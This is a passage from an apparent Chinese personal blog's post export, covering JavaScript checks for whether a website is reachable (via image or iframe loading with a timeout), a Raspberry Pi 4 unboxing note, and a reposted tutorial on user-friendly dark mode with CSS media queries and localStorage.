class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 